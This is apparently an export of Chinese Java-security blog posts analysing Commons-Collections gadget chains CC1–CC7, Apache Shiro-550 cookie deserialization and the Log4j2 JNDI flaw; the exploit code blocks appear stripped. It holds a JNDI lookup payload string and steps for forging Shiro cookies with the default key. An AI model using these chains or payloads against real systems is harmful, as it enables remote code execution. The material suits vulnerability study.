put() 方法 而这个 map 属性是 private 私有属性，无法直接修改这个 map 属性的值，后期我们通过反射来修改 HashMap 这里就和CC6链差不多了，这里还是主要看 key 我们能不能控制 因为在 HashMap 类中调用了 key 这个对象的 hashCode() 方法 在 HashMap 类中想要修改 key 的话需要对 table 属性的节点对象数组进行修改，我们需要先获取该 HashMap 类对象的 table 属性的节点对象数组，然后找到某个键值对，再修改这个 key，当然，这个过程是需要反射来操作的 TiedMapEntry 那么，这个 key 设置为和CC6利用链后半部分一样就可以了，设置为 TiedMapEntry 类对象，这样就可以调用到 TiedMapEntry.hashCode() 方法 在实例化 TiedMapEntry 类对象的时候，将 LazyMap 类对象和 TemplatesImpl 类对象作为构造方法的参数即可，如果CC1-CC7都学过了的话，这里都懂哈 LazyMap 同样的，在 LazyMap 类对象 decorate() 方法的时候，就可以对 factory 属性进行赋值，这里只要把 factory 属性的值设置为 InvokerTransformer 类对象即可，map 赋值一个空的 HashMap 就行，因为后面我们用不到 InvokeTransformer 这里要注意一点，我们需要通过反射来修改 InvokerTransformer 类对象的 iMethodName 属性值，因为在序列化时 HashSet 调用 add() 方法就会触发，这样会导致在序列化时就会执行加载的恶意字节码，所以需要通过反射来修改 最后，到了这里就成功执行了加载的恶意字节码，和CC2的前半部分差不多 根据上面分析的，我们大概能写出中间的部分代码 JDK8以下版本和JDK8及以后版本的 HashMap 类和 HashSet 类的元素存储方式发生了变化，所以以上代码兼容了JDK8以下版本 利用链EXP编写"},{"title":"CommonsCollections7利用链","date":"2023-08-18T15:52:26.000Z","url":"/a70cc9306261.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections7","/tags/CommonsCollections7/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"利用条件Commons-Collections 3.1 - 3.2.1 不限制JDK版本 利用链 上图是在网上找的CC的几个版本链图 利用链分析Hashtable 在 Hashtable 类中的 readObject() 方法中调用了 reconstitutionPut() 方法，该类作为一个反序列化入口 在 readObject() 方法中有以下片段代码 for 循环获取了 Hashtable 中的元素，也就是我们put的那两个元素，这里要注意 key 不能相同，因为在 Hashtable 中 key 是唯一的 如果我们只put一个元素的话，在这里不会进入for循环，不会调用 equals() 方法 我们需要put两个元素，还有一个更重要的一点是put方法会调用两次，如果每次key计算出来的hashCode不一样，那么index变量也会受到影响，在第二次对tab进行迭代时就找不到对应的值了，就不会进行for循环导致不能执行到 e.key.equals(key) 这里 根据上面的代码分析，我们发现貌似对 tab 中的 hash 和当前元素的 hash 进行了比较是否相等 hash 是通过调用 key.hashCode() 方法获得的，那么也就说我们put的两个元素的 key 值 hash 要相等，看ysoserial工具链中的代码，使用了 yy 和 zZ，这两个hashCode是一样的，还有 &quot;&quot; 和 f5a5a608 的hashCode也是一样的 那么我们知道了必须要有两个元素，且这两个元素的 key 分别是 yy 和 zZ，在后面调用了 e.key 的 equals 方法，而这个 key 对象其实就是 LazyMap AbstractMapDecorator 在 LazyMap 类中没有 equals 方法，在它的父类 AbstractMapDecorator 中有 equals() 方法 map 属性是 Map 类型，这里的 map 其实就是 HashMap 类对象，那么我们看下 HashMap 的父类有没有 equals() 方法 AbstractMap 在 HashMap 的父类 AbstractMap 中有一个 equals() 方法，其中调用了 get() 方法，m 就是我们传入的 LazyMap 类对象 后续就是和CC3的前半部分差不多了，后续就不过多介绍了 这里要注意的一点是，在利用代码中调用 hashtable.put() 方法时，也会调用 equals() 方法，所以也能调用到这里的 get() 方法，导致在序列化阶段就执行了恶意代码，这里我们需要先将 ChainedTransformer 实例化对象的构造方法传入一个空的 Transformer[] 对象，等 hashtable.put() 方法调用完之后再通过反射来设置 iTransformers 属性的值为真正需要利用的 Transformer 对象即可 为什么要remove(“yy”)？ 我们正常执行到 hashtable.put(lazyMap1, 1); 是可以正常的将 lazyMap1 对象添加到hashtable中的 由于在调用 hashtable.put() 方法时，也会调用 equals方法，我们第一次put的时候 tab[] 是空的，for循环是进不去的则正常添加到hashtable中 当第二次put的时候，会从hashtable中迭代获取我们上次添加的那个元素 &#123;yy=1&#125;，这里由于 yy 和 zZ 的hashCode一样，则调用 AbstractMap 类的 equals() 方法 这里又使用了迭代器，获取了上次我们添加的那个元素 &#123;yy=1&#125;，此时 key 为 yy，m 变量则是 &#123;zZ=1&#125;，跟进到 LazyMap 的 get() 方法中看一下 这里判断 &#123;zZ=1&#125; 中是否包含 yy 这个键，结果是false，则进入if语句 这里往 lazyMap2 对象中添加了一个元素 &#123;yy=yy&#125;，不论后面如何，这里就很奇怪了，lazyMap2 对象中有两个元素了 &#123;zZ=1,yy=yy&#125;，那么在反序列化时调用 reconstitutionPut() 方法时会导致计算出来的hashCode不一致，就不能进入for循环执行 equals() 方法了 总结一下，这里主要的原因就是在 lazyMap2.put() 时，多加了一个元素，那么在反序列化时 lazyMap1 和 lazyMap2 的key生成出来的hashCode不一致，也就不能执行到 equals() 方法这里了 利用链EXP编写TemplatesImpl ###InvokerTransformer "},{"title":"CommonsCollections6利用链","date":"2023-08-17T15:52:26.000Z","url":"/4255b60bf2b8.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections6","/tags/CommonsCollections6/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"利用条件Commons-Collections 3.1 - 3.2.1版本 不限制JDK版本 利用链 利用链分析 对上面代码进行分析，发现和CC1的LayzMap链很类似，不过后面的用法不同。 那么我们接着CC1的获取到LazyMap对象开始说起，在LayzMap类中的decorate方法返回了LazyMap对象，其对象的get方法中调用了factory的transform方法，即触发Payload。 CC6这条链后面使用了TideMapEntry类，构造方法分别初始化变量。 可知，map变量即是我们的lazymap对象，而想调用到chainedTransformer的transform方法，就必须要调用lazymap对象的get方法，那么在TideMapEntry类中找找看有没有地方调用了。 发现getValue方法调用了，再找一下是哪个函数调用了getValue方法 在其类中发现hashCode方法中调用了，那么后续我们怎么去利用调用到hashCode方法呢？还记得URLDNS链吗？在HashMap中调用put方法中会调用到hashCode方法。 这里使用HashMap对象将TiedMapEntry对象put进去，这样在反序列化HashMap对象时，就会调用到HashMap的readObject方法，其方法有调用hash方法 这样就能调用到我们上面说的lazymap对象的get方法 在序列化时成功执行，在序列化时触发并不是我们想要的，我们需要的是在反序列化时触发。想要解决这个问题，我们需要知道为什么在序列化时就能触发，因为HashMap对象在调用put方法时调用了hash方法，进而一步一步往下执行，TiedMapEntry-&gt;getValue()、LazyMap-&gt;get()、ChainedTransformer-&gt;transform() 我们只需要将这三个中的一个对象先放置一个空的对象，再使用反射修改其对象的属性即可。 这里在LazyMap调用decorate方法时，将factory参数赋值成一个没有意义的ConstantTransformer对象，这样在序列化时就不会触发Payload，再使用反射将factory变量值设置成Payload，这样在反序列化时就能够触发Payload了。 在反序列化时并没有触发，这里和URLDNS链很像，在调用hash方法后判断了HashMap对象的key是否包含指定 lazymap对象的key 在序列化时，判断不存在aaa这个key则会触发ChainedTransformer的transform方法，然后将其key添加到HashMap对象中，那么在下次反序列化时就执行不到158行到160行了，即不会触发Payload，那么有什么办法吗？当然有的，删除innerMap或lazymap对象的key即可。 至此执行成功，整条链都理清楚了，下面是整条链的利用过程代码。 "},{"title":"CommonsCollections5利用链","date":"2023-08-17T14:00:01.221Z","url":"/ab6a59d5d2e4.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections5","/tags/CommonsCollections5/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"利用条件Commons-Collections 3.1 - 3.2.1版本 JDK版本：JDK8u301以下版本和JDK11版本可利用（需要关闭安全管理器，默认关闭） 利用链 利用链分析BadAttributeValueExpException BadAttributeValueExpException 类的父类的父类实现了 Serializable 接口，所以该类也是可被序列化的，查看该类的 readObject 方法 这个反序列化方法调用了 valObj.toString() 方法，而这个 valObj 是我们可控的，其实就是获取了 BadAttributeValueExpException 类的 val 属性，这个我们可以通过构造方法传入进去或者通过反射设置值 虽然可以通过构造方法传入进去，但是为了避免在序列化时就被执行，所以需要通过反射来设置值 在上面我们还注意到，判断了 System.getSecurityManager() 是否为null，如果有安全管理器这条链就不能被利用了，默认是没有的 那么接下来就是要找哪个类的 toString() 方法可以实现一个利用链 TiedMapEntry 在 TiedMapEntry 类中找到了有 toString() 方法，调用了 getKey() 和 getValue() 方法 这里是不是感觉很熟悉呢？是的，和CC6里面很像，getKey() 方法只是返回了一个 key 属性，而 getValue() 方法调用了 map 属性的 get() 方法，那么我们只需要把确保这个 map 是 LazyMap 类对象，这样就能和CC1链一样，调用后续的 transformer 了 在 LazyMap 类的 get() 方法中调用了 factory 属性的 transform() 方法 这样，我们就可以利用CC6的中间部分，然后加以修改，后面 BadAttributeValueExpException 类作为反序列化入口就可以执行恶意代码了 在这里，我并没有使用CC1的前半段，而是使用了CC4的前半段，因为在有些场景中使用 Transformer[] 数组来进行反序列化，有时候数组处理不好的话会出错，所以尽量避免使用 Transformer[] 数组 利用链EXP编写"},{"title":"CommonsCollections4利用链","date":"2023-08-17T12:53:10.867Z","url":"/6071e76d7b09.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections4","/tags/CommonsCollections4/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"利用条件Commons-Collections4版本 JDK版本：JDK8u301以下版本、JDK11和JDK15 利用链 利用链分析由于这里使用了CC2和CC3的部分，我们这里不再分析，只看最后调用过程即可 我们直接从反序列化这边开始看，调用了 heapify() 方法 调用了 siftDown() 方法 调用 siftDownUsingComparator() 方法，在该方法里面调用了 TransformingComparator 类对象的 compare() 方法 这里调用了 ChainedTransformer 类对象的 transform() 方法 对照上面的变量对应的值来看，调用了 InstantiateTransformer 类对象的 transform() 方法 最后通过 TrAXFilter 类构造器实例化对象，其构造方法调用了 newTransformer() 方法即执行了恶意代码 利用链EXP编写方法一 方法二"},{"title":"CommonsCollections3利用链","date":"2023-08-15T08:05:33.000Z","url":"/fcc9661c9ec3.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections3","/tags/CommonsCollections3/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"利用条件CommonsCollections 3.1 - 3.2.1版本 由于使用了 AnnotationInvocationHandler 类，JDK版本：JDK8u71及以下版本（之后版本已修复不可利用） 利用链 利用链分析在CC1和CC6中我们使用 Transformer 类来调用 Runtime 类执行命令的，如果 Runtime 类或可执行命令的类被拉入黑名单禁止执行这条链就走不通了 那么就看下有哪些类有 defineClass() 方法，可以加载我们传入的字节码，这样我们就可以将恶意类转换成恶意字节码传入进去后生成恶意类，再看看哪些地方能够对这个恶意类进行初始化，这样我们就绕过了上面被禁止执行的尴尬局面了 在 TemplatesImpl 类中存在一个 default 修饰符的 defineClass() 方法，看看哪个地方调用了这个方法 还是在这个类中的 defineTransletClasses() 方法中进行了调用，这里可以看到 _bytecodes 变量是不能为空的，再往后看发现通过 defineClass() 方法从字节码加载到的类的父类必须是 ABSTRACT_TRANSLET 常量，查看该常量为 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，如果没有加载的类没有继承这个类则 _transletIndex 为0以上的值，到了后面就会抛异常了，因为 _transletIndex 变量默认值为 -1，也就是说在我们写恶意类时必须继承 AbstractTranslet 类，_tfactory 变量也必须有值，否则在调用时会触发空指针错误，这个变量的值在 TemplatesImpl 类的 readObject() 方法中有进行初始化，值可以是 new TransformerFactoryImpl() 还是在这个类中 getTransletInstance() 方法调用了 defineTransletClasses() 方法，在这个方法中 _name 变量不能为空，_class 必须为空，否则调用不到 defineTransletClasses() 方法，到了后面就是对加载到的类进行初始化了 同样的，getTransletInstance() 方法也是在 TemplatesImpl 类中被 newTransformer() 方法调用的，接下来就是要找哪个类调用了 newTransformer() 方法，且是在该类的构造方法中进行调用的 那么，我们只需要调用 TrAXFilter 类的构造方法即可执行恶意代码，由于该类没有实现序列化接口，所以这里和CC1链一样需要使用 Transformer 链式调用才能绕过反序列化这个限制 到此我们知道怎么去利用字节码去加载类并初始化了，这条链我们就清楚了 这里，我们不再使用CC1中的 new InvokeTransformer() 的方法，而是找一种可以实例化对象可以调用该对象的构造方法的类 然后我们就找到了 InstantiateTransformer 这个类，该类构造函数接受一个Class数组参数类型和一个Object数组参数，其 transform() 方法就是获取了对象的构造器，并进行实例化，这里的 iParamTypes 和 iArgs 变量就是 TrAXFilter 类中构造方法中的参数类型和参数 那么这里就存在一个问题了，如何让 TrAXFilter 类作为对象传进来呢？没错，就是链式调用 这里就和CC1差不多，只不过我们把 new InvokeTransformer() 给换成了 new InstantiateTransformer()，后面其实也是用的CC1的 LazyMap 链，和CC1那边就差不多了 利用链EXP编写"},{"title":"CommonsCollections2利用链","date":"2023-08-14T00:40:04.774Z","url":"/3a3651677a27.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections2","/tags/CommonsCollections2/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"利用条件Commons-Collections4版本 JDK版本：JDK8u301以下版本、JDK11和JDK15 在高版本JDK8u71中修改了 AnnotationInvocationHandler 的 readObject 方法，这也就导致CC1无法在高版本中利用，CC2利用链不再使用 AnnotationInvocationHandler 触发 引入依赖 利用链 利用链分析TransformingComparator TransformingComparator 是一个实现了 Comparator 和 Serializable 接口的类，用于对给定的对象列表进行比较，并通过指定的转换函数对比较的对象进行转换 两个构造方法和一个 compare 方法如上，这里和CC1链中的 LazyMap 类 get 方法类似，就是调用 Transformer 类型对象的 transform 方法 接下来就是要找哪些类调用了 TransformingComparator 类的 compare 方法 PriorityQueue 经过查找 PriorityQueue 类的 siftUpUsingComparator() 方法和 siftDownUsingComparator() 方法调用了，该类实现了 Serializable 接口 该类的 readObject() 方法中调用了 heapify() 方法 heapify() 方法调用了 siftDown() 方法 comparator 不为空的话，siftDown() 方法又调用了 siftDownUsingComparator() 方法 在 siftDownUsingComparator() 方法中调用了 comparator.compare() 方法 TransformingComparator 类实现了 Comparator 接口，所以这里是可直接使用的 为了避免在序列化前时调用 add() 方法就执行到 TransformingComparator.compare() 方法，我们需要在 new TransformingComparator() 时传入一个没有任何意义的 Transformer 类型对象 new ConstantTransformer(1) PriorityQueue 类 queue 属性至少需要两个元素才能进行比较，所以至少需要调用 add() 方法两次 再通过反射将 TransformingComparator 类的 transformer 字段值改成 invokerTransformer 对象就能避免在序列化时会出错的问题 在序列化时调用的是 siftUpUsingComparator() 方法，在反序列化时调用的是 siftDownUsingComparator() 方法 利用链EXP编写 上面是整个调用栈的过程和最后调用到的地方，根据上面调用栈再根据分析就能写出CC2的POC 基于ysoserial链EXP 自定义链EXP"},{"title":"CommonsCollections1利用链","date":"2023-08-13T08:41:00.000Z","url":"/4eb101e5c67c.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections1","/tags/CommonsCollections1/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"利用条件Commons-Collections 3.1 - 3.2.1版本 JDK版本：JDK8u71及以下版本（之后版本已修复不可利用） 利用链介绍 new ConstantTransformer() 调用父类构造方法，并且将参数对象赋值给常量 iConstant new InvokeTransformer() 调用父类构造方法，并且对 InvokeTransformer 类的 iMethodName、iParamTypes、iArgs 进行赋值 InvokeTransformer 类实现了 Transformer 接口，来看看实现接口的 transform 方法 这看起来像个后门，获取对象的Class，然后获取我们上面写好的方法和参数并执行，这就是一个任意命令执行的点。 new ChainedTransformer() 也只是对常量进行赋值操作 因为 ChainedTransformer 类也实现了 Transformer 接口，再看看 transform 方法 这里对 iTransformers 进行循环执行 transform 方法，并且第一个执行的结果是下一个执行 transform 方法的参数对象。在上面，我们将 Transformer 对象数组赋值给了常量 iTransformers，如果调用 transform 方法那么就实现了链式调用，相当于 ChainedTransformer 把 Transformer 对象数组中所有对象串起来执行。 那么构造好了这么个链，我们如何去执行到 ChainedTransformer 中的 transform 方法呢？ 在 TransformedMap 类中发现 checkSetValue 方法中调用了 transform 方法，且 value 参数也是可控的 来看看这个类的构造方法，由于我们需要 TransformedMap 类的实例化对象，TransformedMap 的构造方法貌似不太适合，而这个类的 decorate 方法实例化了 TransformedMap 类并且返回了，是我们想要的！ 那么问题又来了，我们如何执行到 checkSetValue 方法呢？ 查找后，发现该执行点在 AbstractInputCheckedMapDecorator 抽象类中的内部类 MapEntry 中 那么我们只要想办法执行到 setValue 方法，就需要获取到获取到 MapEntry 类的实例化对象 看一看是哪个地方实例化了 MapEntry 类 还是在 AbstractInputCheckedMapDecorator 抽象类中的内部类 EntrySetIterator 再顺藤摸瓜看看谁实例化了 EntrySetIterator 类 发现还是在 AbstractInputCheckedMapDecorator 抽象类中的内部类 EntrySet 经过一番查找，发现实例化 EntrySet 构造方法还是在 AbstractInputCheckedMapDecorator 抽象类中 由于 TransformedMap 继承了 AbstractInputCheckedMapDecorator 抽象类，因此我们可以执行调用 entrySet 方法，接下来就是链式调用就可以得到 MapEntry 对象了，类型是 Map.Entry 得到 MapEntry 对象后，即可调用我们上面找到的 setValue 方法，这条链我们就清楚了。而我们研究的是在反序列化时自动触发调用链，现在研究的这条并不是，所以接下来按照两条链去研究。 TransformedMap链 LazyMap链该利用链在ysoserial工具中 利用链分析TransformedMap链分析 使用 AnnotationInvocationHandler 类作为反序列化入口完整 TransformedMap 链利用代码如下： 下面是JDK1.8u65版本的 AnnotationInvocationHandler 注解类，可以看到，构造函数的 memberValues 接受一个 Map 类型的对象，并赋值到本类的变量 memberValues AnnotationInvocationHandler 注解类重写了 readObject 方法，对我们传入的 Map 对象进行了遍历，在下面我们看到执行了 setValue 方法（如果没有setValue方法的版本，则不能利用成功）。 那么在上面代码中注释写到了，必须key为value，那是为什么呢？ 在这里获取了注解类型，并且在446行获取了这个注解类型的成员变量值，447行进行了判断，只要不为Null则会继续往下执行，否则无法执行到 setValue 方法。 上面的 type 变量其实就是我们在反射获取到 AnnotationInvocationHandler 注解类后实例化的参数 Target.class，为什么要选择这个注解类呢？ 因为 Target.class 有枚举类型成员变量，且是 value 这就解释了上面我们为什么key只能是value的原因。 最后，进行序列化和反序列化操作后，成功弹出计算器。 LazyMap链分析LazyMap是ysoserial工具中的CC1链，而TransformedMap是国内流传的。 LazyMap只需要调用get方法即可执行命令 该方法实例化了LazyMap类，继续跟进 LazyMap 继承了 AbstractMapDecorator 抽象类，判断了传递的Map对象是否是Null，不是则进行赋值操作。 再回到 LazyMap 构造方法中，发现对传递的 chainedTransformer 参数赋值给 LazyMap 的 factory 变量。 再找到 get 方法，可以看到，调用了 factory 对象的 transform 方法 在 invoke 方法中发现调用了get方法，由于 invoke 方法是在对象代理时才能触发，将这个对象进行Proxy代理，Proxy也实现了序列化接口，所以也是可以反序列化的，在 readObject 的时候，调用任意方法就会执行 AnnotationInvocationHandler 的 invoke 方法，此时还不能对此进行反序列化因为此时的入口点为sun.reflect.annotation.AnnotationInvocationHandler#readObject AnnotationInvocationHandler 的invoke方法会调用 LazyMap 对象的 get 方法，就可以调用 transform 方法执行到恶意Payload invoke 方法需要调用任意方法，才可触发，对 AnnotationInvocationHandler 对象进行动态代理，在 readyObject 方法被执行时就可调用到 invoke 方法 AnnotationInvocationHandler 的 memberValues 变量接受的Map类型，所以代理对象类型也是Map，这里我们不能直接进行反序列化，我们需要再套一层执行到handler对象的 AnnotationInvocationHandler 类中的 readObject 方法即可。 以下是LazyMap链的完整代码 "},{"title":"Apache Shiro 550反序列化漏洞分析","date":"2023-08-10T13:41:28.200Z","url":"/9ca83d5eef7a.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["Apache","/tags/Apache/"],["Shiro","/tags/Shiro/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"基本概述Apache Shiro是一个开源的Java安全框架，用于身份验证、授权和加密。它提供了一个简单而强大的API，使开发人员能够轻松地实现安全功能。 Apache Shiro的主要功能包括： 身份验证：提供了用户身份验证的功能，包括基于用户名和密码的验证、基于令牌的验证（如JWT）以及自定义的验证方式。 授权：提供了对用户进行授权的功能，可以根据用户的角色、权限等进行访问控制。 会话管理：可以管理用户的会话，包括会话的创建、销毁、读写等操作。 密码加密：提供了密码加密和解密的功能，帮助开发人员保护用户密码的安全。 Web集成：提供了与Web应用程序的集成支持，可以轻松地将Shiro与常见的Web框架（如Spring MVC）集成在一起。 Apache Shiro框架提供了RememberMe记住我的功能，用户登陆成功后会生成经过加密并编码的Cookie，在服务端接收cookie值后进行Base64解码–&gt;AES解密–&gt;反序列化。 攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–&gt;AES加密–&gt;Base64编码，然后将其作为Cookie的RememberMe字段发送，Shiro将RememberMe进行解密并且反序列化，最终造成反序列化漏洞。 调试分析环境Apache Shiro下载地址： Apache Shiro &lt;&#x3D; 1.2.4 JDK8u65 Apache Tomcat9.0.65 漏洞原理分析加密分析当我们输入账号密码登录后，如果登录成功，则会进入 AbstractRememberMeManager.onSuccessfulLogin 方法，该方法有三个参数，分别是 Subject、AuthenticationToken 和 AuthenticationInfo Subject 表示当前用户的身份，可以通过 SecurityUtils.getSubject() 方法获得。Subject 是进行身份验证和授权操作的主体对象。通过 Subject，可以执行身份验证、授权和会话管理等操作。 AuthenticationToken 是一个包含用户身份凭证的对象，用于表示用户提交的身份验证信息。在身份验证过程中，应用程序通常会将用户提供的用户名和密码封装到AuthenticationToken 对象中。AuthenticationToken 的实现通常由应用程序根据实际情况提供。 AuthenticationInfo 表示用户的身份验证信息，包括身份凭证（如用户名、密码）和相关的认证数据（如角色、权限等）。AuthenticationInfo 对象用于在身份验证过程中验证用户提供的凭证是否正确，并提供用户的身份信息给Shiro使用。 如果在登录时，勾选了记住我的选项，那么在token中 rememberme 值就为true 这里会调用到 getIdentityToRemember 方法 这个方法的主要作用就是用于获取记住身份的标识 在 rememberIdentity 方法里面就是对记住用户身份功能进行一个实现了 convertPrincipalsToBytes 方法对记住身份的标识转成字节数组 在这个方法里面其实就是将身份标识进行序列化成字节数组，然后判断了 CipherService 对象不为null的话就调用 encrypt 方法对序列化后的字节数组进行加密再返回 getCipherService 方法里面返回了 cipherService 对象，该对象就是一个AES加密服务对象，可以看到加密模式为CBC 在 encrypt 方法中调用了AES加密服务对象对其加密 getEncryptionCipherKey 方法就是获取了加密的key，这个key是在 AbstractRememberMeManager 类的构造方法中进行设置的 后面就是调用了 cipherService.encrypt 方法将key和身份标识进行了AES加密，返回了使用key进行AES加密的字节数组 在 CookieRememberMeManager 类 rememberSerializedIdentity 方法中前半部分判断了是不是HTTP请求的，然后使用 WebUtils 类获取了 request 和 response 对象，将使用key加密身份标识后的字节数组进行Base64编码 后面就不过多介绍了，就是设置Cookie了，这就是Shiro从登录成功到设置Cookie的加密身份标识的过程 解密分析 解密分析当然也是在 CookieRememberMeManager 类中，getRememberedSerializedIdentity 方法用于读取Cookie，这里要注意的是在Cookie中不能带有 deleteMe，ensurePadding 方法用来填充我们传入的Base64编码的Cookie，确保数据长度符合加密算法的要求，再往后就是对我们传入的Cookie进行Base64解码成字节数组了 返回了这个解码后的字节数组，我们看下是在哪里调用了这个方法 发现在 AbstractRememberMeManager 类的 getRememberedPrincipals 方法中调用了 getRememberedSerializedIdentity 这个方法 后面调用了 convertBytesToPrincipals 方法将AES加密的字节数组转成 Principal 对象 在该方法中调用了 decrypt 解密方法 这里就和加密分析那边反过来，这里是调用了 cipherService 类的 decrypt 方法来进行解密，然后返回了解密后的序列化字节数组 将解密后的字节数组作为参数调用了 deserialize 方法 deserialize 方法中使用了默认序列化器进行了反序列化，如果我们将恶意的类进行序列化生成 ser.bin 文件，将序列化的文件内容使用Shiro默认key进行加密，再经过Base64编码即可执行恶意代码 漏洞利用脚本根据上面的分析，写出以下两种语言的读取序列化文件内容进行AES加密再Base64编码脚本 Python Go 利用链EXP编写存在的问题 Commons-Beanutils库服务端和生成恶意序列化字节码使用的版本一致 如果使用不同的版本，serialVersionUID 可能会不一样，导致无法反序列化 org.apache.commons.collections.comparators.ComparableComparator 依赖Commons-Collections环境 由于 org.apache.commons.collections.comparators.ComparableComparator 类使用了Commons-Collections URLDNS URLDNS链常用来探测漏洞是否存在，该链不需要任何依赖 不依赖Commons-Collections 依赖Commons-Collections 环境中存在Commons-Collections依赖的话利用链就更多了，这里只使用了CC11的利用链"},{"title":"Log4j2反序列化利用与分析","date":"2023-08-09T04:30:08.081Z","url":"/91ba9d0d39fd.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["Log4j2","/tags/Log4j2/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"基本概述Apache Log4j是一个流行的Java日志框架，用于将应用程序的日志输出到不同的目标，如文件、控制台或远程服务器。 2021年被爆存在远程代码执行漏洞，CVE漏洞编号为CVE-2021-44228，该漏洞可能导致远程代码执行，该漏洞的根本原因在于Log4j2中的一个特性，它允许开发人员通过特殊的日志消息来触发远程代码执行。具体来说，当Log4j2解析包含特定的JNDI（Java命名和目录接口）引用的日志消息时，它将尝试通过JNDI查找来获取对应资源的引用。攻击者可以构造一个恶意的JNDI引用，通过发送包含该引用的日志消息来触发远程代码执行。 影响版本2.0.0 &lt;&#x3D; Apache Log4j &lt;&#x3D; 2.14.0 JDK影响版本是根据JDK本身版本有关，高版本也存在被绕过风险 Log4j使用基础使用Log4j先引入依赖 在 resources 文件夹中新建 log4j2.xml 文件，用于配置log4j $&#123;&#125; 在Log4j中被称为变量插值，它是一种特殊的语法，用于在日志消息中引用和替换变量的值，通过在 $&#123;&#125; 中指定变量名称，Log4j可以动态地将变量的值插入到日志消息中 需要注意的是，在Log4j中使用变量插值时，变量的值可以从不同的来源获取，例如系统属性、环境变量、配置文件等。这使得Log4j可以根据不同的部署环境和配置文件进行灵活的日志定制 CVE-2021-44228调试分析 在 info 方法中，判断了是否开启了日志记录 调用了 logMessageSafely 方法，用于将日志安全的记录到日志文件中，确保不会记录日志消息时发生任何异常和错误，继续往下走 logMessageTrackRecursion 方法用于记录递归调用的日志信息，再继续往下走 tryLogMessage 方法尝试记录日志消息，分析切入点正是这里 在这个方法里其实就是调用了 log 方法，如果出现异常，则抛出异常，跟进 log 方法看一下 获取了 Logger 的日志记录器配置对象，再调用了 log 方法 在该方法中通过日志事件工厂对象 logEventFactory 创建了一个Log4j日志事件对象，并作为参数调用了 log 方法，继续往下走 这里调用 processLogEvent 方法处理日志事件 这里就是对日志事件的输出目标附加器进行遍历，我们再来看下在 callAppender 方法中做了什么 shouldSkip 方法用于控制和判断日志事件是否被过滤或是否存在递归调用，随后调用了 callAppenderPreventRecursion 预防递归调用附加器方法 到了这里尝试对Log4j日志事件对象调用附加器，继续跟进 这里将日志事件对象添加到 ConsoleAppender 附加器中 append 方法中调用了 tryAppend 方法，在该方法中判断了是否开启了直接编码器，默认是开启的，调用 directEncodeEvent 方法 在这里获取了日志事件布局，在日志事件布局中包含输出的格式、日期、日志级别、消息内容等信息，再调用了日志事件布局对象的 encode 方法 调用 toText 方法将日志事件序列化为字符串 在该方法中调用序列化器的 toSerializable 方法，serializer 其实就是模式序列化器，有如下的模式格式化器： 我们需要关注是 MessagePatternConverter 消息格式转换器，因为只有这一格式转换器是我们可控的，也就是一开始传入的参数 message，我们跟进一下toSerializable方法 这里其实就是对模式序列化器进行遍历格式化调用 format 方法，我们的关注点是在 MessagePatternConverter 中，所以跳过无关紧要的格式转换器，直接到索引为8的 PatternFormatter 模式格式化器 format 方法中看做了什么 调用了转换器的 format 方法，目前的转换器是 MessagePatternConverter msg 对象中的 message 就是我们一开始传入参数的日志消息，随后将 msg 对象强转成 StringBuilderFormattable 类型再调用了 formatTo 方法 workingBuilder 对象存放的就是日志输出的前缀信息 这里其实就是将 message 内容追加到 workingBuilder 中 noLookups 默认为false，这里对 workingBuilder 内容进行遍历，判断第一个字符和第二个字符是否分别为 $ 和 &#123; 符号，value 变量就是截取的字符串 $&#123;jndi:ldap://127.0.0.1:8085/kOXQHHlE&#125;，接着设置 workingBuilder 的长度为 offset，并追加内容为 config.getStrSubstitutor().replace() 方法的返回值 replace 方法中调用了 substitute 方法 substitute 方法的前面部分主要是获取了变量的前缀和后缀匹配器，前缀匹配器为 $ 和 &#123;，后缀匹配器为 &#125;，再获取了转义特殊字符的转义字符也就是 $ 和分隔符匹配器 : 和 -，接着就是把 buf 对象转换为字符数组，从0开始循环一直到这个字符串的长度38为止，然后依次循环匹配是否到前缀匹配器，前两个就匹配到了，返回值不是0所以走else语句 接着就是继续循环查找后缀匹配器 bufName 变量就是去掉前缀和后缀匹配器后的字符串，然后再调用了 substitute 方法 还是到了这个方法里，再重复上面的操作，一直找前缀匹配器找不到，后面接着查找分隔符匹配器也没有找到，然后就是调用 resolveVariable 方法解析变量 在该方法里获取了变量解析器，解析器支持的Lookup如上图所示 对 var 的字符串以 : 分割，获取了后面的内容，并且获取字符串的前缀 jndi，再从 StrLookupMap 对象中查找对应的 Lookup 类，接着就是调用了 JndiLookup 类的 lookup 方法 然后就是获取了默认的JNDI管理器，通过该管理器调用 lookup 方法 这里就是调用了原生的 lookup 方法，后面就是JNDI注入了，执行了恶意ldap服务上的恶意代码，最终成功执行 Payload变形绕过WAF 参考链接 